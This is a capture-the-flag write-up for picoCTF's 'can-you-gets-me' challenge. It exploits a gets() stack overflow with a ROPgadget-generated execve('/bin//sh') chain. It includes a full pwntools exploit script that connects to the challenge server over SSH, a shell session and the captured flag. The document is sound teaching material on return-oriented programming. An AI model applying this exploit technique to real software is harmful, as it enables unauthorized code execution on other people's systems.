# can-you-gets-me
Binary Exploitation, 650 points

## Description:
> Can you exploit the following program to get a flag? You may need to think return-oriented if you want to program your way to the flag.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("GIVE ME YOUR NAME!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}

```

## Solution:

The buffer overflow is pretty obvious, and the question points us to a ROP attack.

[RopGadget](https://github.com/JonathanSalwan/ROPgadget) can be very useful in these situations:
```console
root@kali:/media/sf_CTFs/pico/can-you-gets-me# ROPgadget --binary ./gets --ropchain > rop_output.txt
root@kali:/media/sf_CTFs/pico/can-you-gets-me# tail -n 100 rop_output.txt
0x080b5a91 : xor eax, eax ; pop edi ; pop ebp ; ret
0x080681c0 : xor eax, eax ; pop edi ; ret
0x08091e77 : xor eax, eax ; pop esi ; pop edi ; pop ebp ; ret
0x080528a7 : xor eax, eax ; pop esi ; pop edi ; ret
0x08049303 : xor eax, eax ; ret
0x080b7e66 : xor ebp, dword ptr [edx + 0x1a] ; push 1 ; mov eax, dword ptr [esp + 0x28] ; call eax
0x080b7e20 : xor ebp, dword ptr [edx + 0xa] ; push 1 ; call eax
0x080b7dfa : xor ebp, dword ptr [edx + 0xa] ; push 1 ; mov eax, dword ptr [esp + 0x28] ; call eax
0x0804f0e0 : xor ebx, ebx ; jmp 0x804f0aa
0x0804e193 : xor ebx, ebx ; mov eax, ebx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080b767f : xor ebx, ecx ; mov eax, esi ; jmp 0x80b7068
0x08049633 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret
0x080563a9 : xor edi, dword ptr [ecx] ; ret
0x080a9479 : xor edi, ebx ; inc dword ptr [ebx + 0x7d8010c4] ; ret
0x0804db5a : xor edi, edi ; mov eax, dword ptr ss:[esp + 0x10] ; call eax
0x0804e253 : xor edx, dword ptr [0x18] ; call edx
0x0804e252 : xor edx, dword ptr gs:[0x18] ; call edx
0x080709b4 : xor edx, edx ; cmp ebx, eax ; setne dl ; jmp 0x807099f
0x08080efb : xor edx, edx ; div esi ; add eax, ebx ; pop ebx ; pop esi ; ret
0x0808aea0 : xor edx, edx ; div esi ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08071ba1 : xor edx, edx ; mov eax, edx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x080847e5 : xor esi, dword ptr [ecx] ; jmp 0x8083739
0x080b9ff3 : xor esi, esi ; pop ebx ; mov eax, esi ; pop esi ; pop edi ; pop ebp ; ret
0x0808e10c : xor esi, esi ; ret 0xf01

Unique gadgets found: 11741

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x8051035 mov dword ptr [esi], edi ; pop ebx ; pop esi ; pop edi ; ret
        [+] Gadget found: 0x8048433 pop esi ; ret
        [+] Gadget found: 0x8048480 pop edi ; ret
        [-] Can't find the 'xor edi, edi' gadget. Try with another 'mov [r], r'

        [+] Gadget found: 0x80549db mov dword ptr [edx], eax ; ret
        [+] Gadget found: 0x806f02a pop edx ; ret
        [+] Gadget found: 0x80b81c6 pop eax ; ret
        [+] Gadget found: 0x8049303 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

        [+] Gadget found: 0x8049303 xor eax, eax ; ret
        [+] Gadget found: 0x807a86f inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

        [+] Gadget found: 0x80481c9 pop ebx ; ret
        [+] Gadget found: 0x80de955 pop ecx ; ret
        [+] Gadget found: 0x806f02a pop edx ; ret

- Step 4 -- Syscall gadget

        [+] Gadget found: 0x806cc25 int 0x80

- Step 5 -- Build the ROP chain

        #!/usr/bin/env python2
        # execve generated by ROPgadget

        from struct import pack

        # Padding goes here
        p = ''

        p += pack('<I', 0x0806f02a) # pop edx ; ret
        p += pack('<I', 0x080ea060) # @ .data
        p += pack('<I', 0x080b81c6) # pop eax ; ret
        p += '/bin'
        p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x0806f02a) # pop edx ; ret
        p += pack('<I', 0x080ea064) # @ .data + 4
        p += pack('<I', 0x080b81c6) # pop eax ; ret
        p += '//sh'
        p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x0806f02a) # pop edx ; ret
        p += pack('<I', 0x080ea068) # @ .data + 8
        p += pack('<I', 0x08049303) # xor eax, eax ; ret
        p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x080481c9) # pop ebx ; ret
        p += pack('<I', 0x080ea060) # @ .data
        p += pack('<I', 0x080de955) # pop ecx ; ret
        p += pack('<I', 0x080ea068) # @ .data + 8
        p += pack('<I', 0x0806f02a) # pop edx ; ret
        p += pack('<I', 0x080ea068) # @ .data + 8
        p += pack('<I', 0x08049303) # xor eax, eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0806cc25) # int 0x80
```

We simply need to plug this into our script, and there's almost nothing left to do:
```python
from pwn import *
import struct
import argparse
import os

EXECUTABLE = "gets"
LOCAL_PATH = "./"
REMOTE_PATH = "/problems/can-you-gets-me_1_e66172cf5b6d25fffee62caf02c24c3d/"
SSH_SERVER = "2018shell3.picoctf.com"

def get_process_path(is_ssh = False):
    if is_ssh or os.path.exists(REMOTE_PATH):
        return REMOTE_PATH + EXECUTABLE
    else:
        return LOCAL_PATH + EXECUTABLE

def get_process(ssh_user = None):
    is_ssh = ssh_user is not None
    path = get_process_path(is_ssh)
    params = {"argv": path, "cwd": os.path.dirname(path)}
    if is_ssh:
        s = ssh(host=SSH_SERVER, user=ssh_user)
        p = s.process(**params)
    else:
        p = process(**params)
    return p

def send_payload(proc, payload):
    proc.sendlineafter("GIVE ME YOUR NAME!\n", payload)

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
	os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")

	proc = process(get_process_path())
	payload = cyclic(100)
	send_payload(proc, payload)
	proc.wait()
	offset = cyclic_find(proc.corefile.eip)
	log.info("Overflow offset: {}".format(offset))
	return offset

def get_rop(overflow_offset):
    # execve generated by ROPgadget

    p = ""
    p += struct.pack('<I', 0x0806f02a) # pop edx ; ret
    p += struct.pack('<I', 0x080ea060) # @ .data
    p += struct.pack('<I', 0x080b81c6) # pop eax ; ret
    p += '/bin'
    p += struct.pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
    p += struct.pack('<I', 0x0806f02a) # pop edx ; ret
    p += struct.pack('<I', 0x080ea064) # @ .data + 4
    p += struct.pack('<I', 0x080b81c6) # pop eax ; ret
    p += '//sh'
    p += struct.pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
    p += struct.pack('<I', 0x0806f02a) # pop edx ; ret
    p += struct.pack('<I', 0x080ea068) # @ .data + 8
    p += struct.pack('<I', 0x08049303) # xor eax, eax ; ret
    p += struct.pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
    p += struct.pack('<I', 0x080481c9) # pop ebx ; ret
    p += struct.pack('<I', 0x080ea060) # @ .data
    p += struct.pack('<I', 0x080de955) # pop ecx ; ret
    p += struct.pack('<I', 0x080ea068) # @ .data + 8
    p += struct.pack('<I', 0x0806f02a) # pop edx ; ret
    p += struct.pack('<I', 0x080ea068) # @ .data + 8
    p += struct.pack('<I', 0x08049303) # xor eax, eax ; ret
    p += struct.pack('<I', 0x0807a86f) # inc eax ; ret
    p += struct.pack('<I', 0x0807a86f) # inc eax ; ret
    p += struct.pack('<I', 0x0807a86f) # inc eax ; ret
    p += struct.pack('<I', 0x0807a86f) # inc eax ; ret
    p += struct.pack('<I', 0x0807a86f) # inc eax ; ret
    p += struct.pack('<I', 0x0807a86f) # inc eax ; ret
    p += struct.pack('<I', 0x0807a86f) # inc eax ; ret
    p += struct.pack('<I', 0x0807a86f) # inc eax ; ret
    p += struct.pack('<I', 0x0807a86f) # inc eax ; ret
    p += struct.pack('<I', 0x0807a86f) # inc eax ; ret
    p += struct.pack('<I', 0x0807a86f) # inc eax ; ret
    p += struct.pack('<I', 0x0806cc25) # int 0x80

    return fit({overflow_offset: p})

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssh_user", help="Connect via SSH with the given username")
args = parser.parse_args()

context.binary = get_process_path()
offset = get_overflow_offset()

payload = get_rop(offset)

p = get_process(args.ssh_user)
send_payload(p, payload)
p.interactive()
```

The output:
```console
root@kali:/media/sf_CTFs/pico/can-you-gets-me# python exploit.py --ssh_user=$pico_ssh_user
[*] '/media/sf_CTFs/pico/can-you-gets-me/gets'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './gets': pid 994
[*] Process './gets' stopped with exit code -11 (SIGSEGV) (pid 994)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/can-you-gets-me/core.994'
    Arch:      i386-32-little
    EIP:       0x61616168
    ESP:       0xff8c6b60
    Exe:       '/media/sf_CTFs/pico/can-you-gets-me/gets' (0x8048000)
    Fault:     0x61616168
[*] Overflow offset: 28
[+] Connecting to 2018shell3.picoctf.com on port 22: Done
[*] user@2018shell3.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Starting remote process '/problems/can-you-gets-me_1_e66172cf5b6d25fffee62caf02c24c3d/gets' on 2018shell3.picoctf.com: pid 52148
[*] Switching to interactive mode
$ $ ls
flag.txt  gets    gets.c
$ $ cat flag.txt
picoCTF{rOp_yOuR_wAY_tO_AnTHinG_700e9c8e}$ $ exit
[*] Got EOF while reading in interactive
$
[*] Stopped remote process 'gets' on 2018shell3.picoctf.com (pid 52148)
[*] Got EOF while sending in interactive
```

The flag: picoCTF{rOp_yOuR_wAY_tO_AnTHinG_700e9c8e}